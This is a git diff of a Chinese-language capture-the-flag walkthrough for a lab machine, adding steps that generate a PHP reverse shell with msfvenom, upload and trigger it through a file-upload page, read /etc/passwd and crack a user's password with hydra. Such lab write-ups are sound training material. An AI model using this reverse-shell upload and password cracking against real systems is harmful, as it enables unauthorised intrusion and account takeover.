@@ -6,7 +6,7 @@
 #### 搜尋靶機IP
 > **Kali>** <code>arp-scan -l</code> </br>
 ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/e53f9a10-cfff-4cc6-8ea3-7891432dcc6c)</br>
-💡：去掉頭跟尾(IP)，確定靶機為192.168.203.129
+💡：去掉頭跟尾(IP)，確定靶機為 192.168.203.129
 
 
 #### 弱點掃描
@@ -29,7 +29,7 @@
 #### 使用dirb嘗試看看
 ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/378d385b-8ddc-4073-9f80-a24841b581d4)
 ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/954f81f4-387a-4f15-aa83-fdcdeba341ba)
-> 在http://192.168.203.129/flag找到第一支旗
+> 在 http://192.168.203.129/flag 找到第一支旗
 ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/3029e6e9-a3a2-4390-91ad-1f08fa929ecd)
 ```js
     This is a Jimmy's Cyber Class:10 points
@@ -48,6 +48,27 @@
     Of course you know password crack is illegal:10 points
 ```
 
-#### 使用第二支旗給的帳密
-> 在http://192.168.203.129/login.php(第四支旗的網頁)進入了可以上傳資料的網頁
+#### 進入靶機
+> 使用第二支旗給的帳密
+> 在 http://192.168.203.129/login.php (第四支旗的網頁)進入了可以上傳資料的網頁
+![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/0c9b6c6b-30d9-4b56-a8dc-dd2da4c0fc21)
+> **使用反向工程**
+> 在我好找的地方養一隻可愛的彩虹小馬
+> <code>msfvenom -p php/reverse_php LHOST=192.168.203.129 LPORT=1234 -f raw > shell.php</code>
+> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/acba887e-1c5f-4741-a252-9417579f4156)
+> 把他上傳
+> 在掃80port的時候注意到有個upload_files，感覺可以讓靶機開我的檔案
+> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/9beecb0f-a4a7-484b-a481-dad0820cdc88)
+> 在upload_files開啟我的檔案，成功進入靶機
+> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/1c487e45-5815-4a4c-9833-749ba16edfea)
+> 我這時候只有www-data的權限，做不了甚麼但可以查看使用者
+> <code>Cat /etc/passwd</code>
+> 有兩個使用者，Jimmy和technawi可以做密碼破解使用hydra
+> 發現Jimmy比較容易破出來
+> 使用Jimmy進行登入
+> 發現bash無法下sudo，故先下bash指令
+> **$** <code>su jimmy</code>
+
+
+
 
